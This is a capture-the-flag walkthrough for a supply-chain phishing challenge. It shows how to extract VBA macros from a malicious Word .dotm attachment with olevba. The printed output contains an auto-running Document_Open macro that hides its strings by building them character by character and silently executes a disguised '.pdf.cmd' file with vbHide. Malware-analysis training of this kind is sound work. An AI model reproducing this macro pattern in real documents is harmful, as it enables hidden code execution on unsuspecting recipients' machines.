# WALKTHROUGH: Khlos L Supplier

## Abstract

This challenge explores how supply chain attack can be done through a compromized third party/external company the target is dealing with.

If the trusted copany gets hacked and no preventive measures check the exchange between the two companies, it'll definetly get down too.

The players are given a list of mail dump from one of the workers. Upon inspection, 'MECHA PARTS NOTICE.eml' has an attachement.

Checking the attachement we find a `.docs.dotm` file that has macros within it. 

For the sake of simplicity, I didn't include a some kind of banner within the file that says enable macros or something of that sort like in [Here](https://www.ired.team/offensive-security/initial-access/phishing-with-ms-office/t1137-office-vba-macros)

So the players have two options: 

  - Check the ,acros manually with wahtever software that opens `.dotm` files: NOT RECOMMENDED, if dealing with advanced malware samples iwth advanced techniques, one might get infected.

  - Use `olevba` to extract whatever the file has embedded.

## Olevba 
### Installation 
```bash
python3 -m venv ole_venv
source ole_venv/bin/activate
pip install oletools
```
### Usage

```bash
$ cp file.dotm file.zip
mkdir tmp_doc
unzip attachment.zip -d tmp_doc
ls -l tmp_doc/word
# look for vbaProject.bin
olevba tmp_doc/word/vbaProject.bin
```



```bash
(venv)$ olevba word/vbaProject.bin
olevba 0.60.2 on Python 3.12.3 - http://decalage.info/python/oletools
===============================================================================
FILE: word/vbaProject.bin
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    ' Social engineering message
    Dim arrMsg, arrTitle, aMsg, aTitle
    arrMsg = Array("S", "e", "c", "u", "r", "i", "n", "e", "t", "s", " ", "E", "N", "I", "T", " ", "s", "a", "y", "s", ":", " ", "6", "1", "7", "3", "2", "1", "a", "5", "b", "3", "f", "6", "8", "3", "b", "f", "6", "1", "0", "e", "6", "6", "c", "2", "7", "7", "8", "7", "b", "3", "b", "1")
    arrTitle = Array("C", "a", "t", " ", "T", "h", "e", " ", "F", "l", "a", "g", " ", "S", "e", "c", "o", "n", "d", " ", "E", "d", "i", "t", "i", "o", "n")
    
    aMsg = Join(arrMsg, "")
    aTitle = Join(arrTitle, "")
    
    MsgBox aMsg, vbOKOnly, aTitle

    ' Execute the dummy payload
    Dim x1 As Long
    Dim sPath As String
    sPath = Chr(67) & ":" & Chr(92) & Join(Array("U", "s", "e", "r", "s"), "") & Chr(92) & Join(Array("j", "o", "h", "n"), "") & Chr(92) & Join(Array("D", "o", "c", "u", "m", "e", "n", "t", "s"), "") & Chr(92)
    
    ' Payload file name char by char
    Dim arrFile
    arrFile = Array("S", "e", "c", "u", "r", "i", "n", "e", "t", "s", "E", "N", "I", "T", "_", "C", "a", "t", "T", "h", "e", "F", "l", "a", "g", "_", "S", "e", "c", "o", "n", "d", "E", "d", "i", "t", "i", "o", "n", ".", "p", "d", "f", ".", "c", "m", "d")
    sPath = sPath & Join(arrFile, "")
    
    x1 = Shell(sPath, vbHide)

    ' Log execution
    Dim fsoOb As Object, fOb As Object
    Set fsoOb = CreateObject(Join(Array("S", "c", "r", "i", "p", "t", "i", "n", "g", ".", "F", "i", "l", "e", "S", "y", "s", "t", "e", "m", "O", "b", "j", "e", "c", "t"), ""))
    Set fOb = fsoOb.CreateTextFile(Chr(67) & ":" & Chr(92) & "macro_log.txt", True)
    fOb.WriteLine "Macro executed at " & Now
    fOb.Close
End Sub

-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: word/vbaProject.bin - OLE stream: 'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub This()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateTextFile      |May create a text file                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```
